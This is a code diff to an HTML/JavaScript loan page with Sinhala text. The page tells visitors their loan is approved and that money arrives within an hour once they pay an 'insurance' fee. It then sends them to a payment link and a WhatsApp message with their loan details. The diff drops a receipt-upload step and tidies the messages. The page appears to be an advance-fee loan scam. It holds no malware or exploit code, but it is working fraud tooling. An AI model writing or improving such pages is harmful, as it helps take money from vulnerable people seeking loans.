@@ -166,13 +166,8 @@ canvas{
 <div class="statement">
 ඔබ ලබාගන්නා ණය මුදල අනුමත වී ඇත.<br><br>
 රක්ෂණ මුදල ගෙවා පැයක් ඇතුළත මුදල් බැර කෙරේ.<br><br>
-රිසිට් පත WhatsApp හරහා එවනු ලැබේ.
+මෙම විස්තර WhatsApp හරහා යවනු ලැබේ.
 </div>
-
-<label>Upload Receipt</label>
-<input type="file" id="receipt" accept="image/*">
-
-<button onclick="submitForm()">Submit</button>
 
 <button class="pay-btn" onclick="payNow()">ගෙව්ම කරන ආකාරය / Pay Now</button>
 
@@ -204,11 +199,10 @@ const loading=document.getElementById("loading");
 const loadingText=document.getElementById("loadingText");
 
 let AUTO_CUSTOMER_ID="";
-let receiptPreviewURL="";
 
 /* LOADING */
-function showLoading(t){
- loadingText.innerText=t;
+function showLoading(text){
+ loadingText.innerText=text;
  loading.style.display="flex";
 }
 function hideLoading(){
@@ -294,26 +288,9 @@ function goNext(){
  },6000);
 }
 
-/* RECEIPT PREVIEW LINK */
-receipt.onchange=e=>{
- const file=e.target.files[0];
- if(file){
-  receiptPreviewURL=URL.createObjectURL(file);
- }
-}
-
-/* SUBMIT */
-function submitForm(){
- if(!receiptPreviewURL){
-  showPopup("කරුණාකර receipt upload කරන්න");
-  return;
- }
- showPopup("Receipt uploaded successfully. WhatsApp click කරන්න.");
-}
-
 /* PAY */
 function payNow(){
- showLoading("Redirecting...");
+ showLoading("Redirecting to payment...");
  setTimeout(()=>{
   hideLoading();
   window.open(PAY_LINK,"_blank");
@@ -322,12 +299,7 @@ function payNow(){
 
 /* WHATSAPP */
 function sendWhatsApp(){
- if(!receiptPreviewURL){
-  showPopup("Receipt upload කරලා පසුව WhatsApp යවන්න");
-  return;
- }
-
- showLoading("Preparing WhatsApp...");
+ showLoading("Preparing WhatsApp message...");
 
  setTimeout(()=>{
   hideLoading();
@@ -336,13 +308,10 @@ function sendWhatsApp(){
 `📄 Loan Details ✅
 
 Customer ID: ${AUTO_CUSTOMER_ID}
-Loan Amount: Rs.${showAmount.innerText}
-Insurance Payment: Rs.${insurance.innerText}
+Loan Amount: Rs. ${showAmount.innerText}
+Insurance Payment: Rs. ${insurance.innerText}
 
-🧾 Receipt Preview:
-${receiptPreviewURL}
-
-⚠️ Note: Image link open කර verify කරගන්න.`;
+⏰ ${new Date().toLocaleString()}`;
 
   window.open(
    `https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`,
